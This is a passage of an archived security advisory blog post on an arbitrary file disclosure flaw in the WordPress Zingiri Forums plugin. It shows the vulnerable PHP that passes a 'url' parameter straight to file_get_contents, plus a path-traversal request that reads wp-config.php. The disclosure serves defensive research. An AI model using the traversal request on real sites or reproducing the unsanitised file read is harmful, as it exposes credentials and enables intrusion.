+		else $key=$_GET['url'];
+		if (isset($_SESSION['ccforum']['stylesheet'][$key])) {
+			$output=$_SESSION['ccforum']['stylesheet'][$key];
+		} else {
+			if (isset($_GET['stylesheet'])) {
+				$http=zing_forum_http("mybb",'css.php',"");
+				$news = new zHttpRequest($http,'zingiri-forum');
+				if (!$news-&gt;curlInstalled()) return "cURL not installed";
+				elseif (!$news-&gt;live()) return "A HTTP Error occured";
+				$output=$news-&gt;DownloadToString();
+				$output=str_replace('url(images/','url('.ZING_MYBB_URL.'/images/',$output);
+
+			} elseif ($_GET['url']) {
+				$url=$_GET['url'];
+				$output=file_get_contents(ZING_MYBB_DIR.'/cache/themes/'.$url);
+			}
+			$f[]='/^body.*{(.*?)/';
+			$r[]=' {$1';
+			$f[]='/.zingbody/';
+			$r[]='';
+			$f[]='/(.*?).{(.*?)/';
+			$r[]='.ccforum $1 {$2';
+			$f[]='/(.*?),(.*?).{(.*?)/';
+			$r[]='$1,.ccforum $2 {$3';
+			$f[]='/(.*?),(.*?),(.*?).{(.*?)/';
+			$r[]='$1,$2,.ccforum $3 {$4';
+			$output=preg_replace($f,$r,$output,-1,$count);
+			if ($output) $_SESSION['ccforum']['stylesheet'][$key]=$output;
+		}
+		header("Content-type: text/css");
+		echo $output;
+		die();</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c97c054abea355910577-541">541</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-542">542</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-543">543</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-544">544</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-545">545</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-546">546</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-547">547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-548">548</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-549">549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-550">550</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-551">551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-552">552</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-553">553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-554">554</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-555">555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-556">556</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-557">557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-558">558</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-559">559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-560">560</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-561">561</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-562">562</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-563">563</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-564">564</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-565">565</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-566">566</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-567">567</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-568">568</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-569">569</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-570">570</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-571">571</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-572">572</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-573">573</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abea355910577-574">574</div><div class="crayon-num" data-line="crayon-53c97c054abea355910577-575">575</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c97c054abea355910577-541"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">==</span><span class="crayon-s">'css'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-542"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_end_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-543"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-544"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-545"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-546"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-547"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-548"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-549"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">http</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_http</span><span class="crayon-sy">(</span><span class="crayon-s">"mybb"</span><span class="crayon-sy">,</span><span class="crayon-s">'css.php'</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">news</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">zHttpRequest</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">http</span><span class="crayon-sy">,</span><span class="crayon-s">'zingiri-forum'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-551"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">curlInstalled</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"cURL not installed"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">live</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"A HTTP Error occured"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-553"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">DownloadToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'url(images/'</span><span class="crayon-sy">,</span><span class="crayon-s">'url('</span><span class="crayon-sy">.</span><span class="crayon-v">ZING_MYBB_URL</span><span class="crayon-sy">.</span><span class="crayon-s">'/images/'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-555">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-557"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">ZING_MYBB_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/cache/themes/'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/^body.*{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">' {$1'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-562"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/.zingbody/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-563"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-564"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-565"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'.ccforum $1 {$2'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-566"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-567"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,.ccforum $2 {$3'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-568"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-569"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,$2,.ccforum $3 {$4'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-570"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">preg_replace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">count</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-571"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-572"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-573"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: text/css"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abea355910577-574"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abea355910577-575"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0126 seconds] -->
+<p>If we don&#8217;t set anything expect the &#8220;url&#8221; get variable, we can cause it to be fed into the file_get_contents call on line 554. We can abuse this to disclose the contents of the wp-config.php file like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c97c054abf9253143346" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+http://192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c97c054abf9253143346-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c97c054abf9253143346-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>&nbsp;</p>
+					</div><!-- .entry-content -->
+
+	<footer class="entry-meta">
+				This entry was tagged <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="http://ceriksen.com/tag/zingiri-forums/" rel="tag">Zingiri Forums</a>. Bookmark the <a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="Permalink to WordPress Zingiri Forums arbitrary file disclosure" rel="bookmark">permalink</a>.
+					</footer><!-- .entry-meta -->
+</article><!-- #post-164 -->
+
+					<nav id="nav-below">
+		<h2 class="assistive-text">Post navigation</h2>
+
+		
+					<div class="nav-previous"><a href="http://ceriksen.com/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/" rel="prev"><span class="meta-nav">&larr;</span> WordPress Google Document Embedder arbitrary file disclosure</a></div>			<div class="nav-next"><a href="http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/" rel="next">WordPress Floating Social Media Link Plugins Remote File Inclusion <span class="meta-nav">&rarr;</span></a></div>						
+	
+	</nav><!-- #nav-below -->
+	
+						<div id="comments">
+	
+	
+			<h2 id="comments-title">
+			One comment		</h2>
+
+		
+		<ol class="commentlist">
+				<li class="comment even thread-even depth-1" id="li-comment-591">
+		<article id="comment-591" class="comment">
+			<footer class="comment-meta">
+				<div class="comment-author vcard">
+					<img alt='' src='http://0.gravatar.com/avatar/84487cc9500db7c6266932f81383e706?s=68&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D68&amp;r=G' class='avatar avatar-68 photo' height='68' width='68' /><span class="fn"><a href='http://ha.cker.in' rel='external nofollow' class='url'>Secer</a></span> <a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/#comment-591"><time pubdate datetime="2013-01-24T09:10:09+00:00">January 24, 2013 at 9:10 am</time></a>
+									</div><!-- .comment-author .vcard -->
+
+				
+			</footer>
+
+			<div class="comment-content"><p>Thx~</p>
+</div>
+
+			<div class="reply">
+				<a rel="nofollow" class="comment-reply-login" href="http://ceriksen.com/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2013%2F01%2F12%2Fwordpress-zingiri-forums-arbitrary-file-disclosure%2F">Log in to Reply</a>			</div><!-- .reply -->
+		</article><!-- #comment-## -->
+
+	</li><!-- #comment-## -->
+		</ol>
+
+		
+	
+									<div id="respond" class="comment-respond">
+				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/#respond" style="display:none;">Cancel reply</a></small></h3>
+									<p class="must-log-in">You must be <a href="http://ceriksen.com/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2013%2F01%2F12%2Fwordpress-zingiri-forums-arbitrary-file-disclosure%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
+			
+</div><!-- #comments -->
+
+			
+			</div><!-- #content -->
+		</div><!-- #primary -->
+
+			<div id="secondary" class="widget-area" role="complementary">
+			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
+SA51348<br />
+SA51344<br />
+SA51336 </p>
+</div>
+		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
+</li>
+	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
+</li>
+	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
+					<li>
+				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
+						</li>
+					<li>
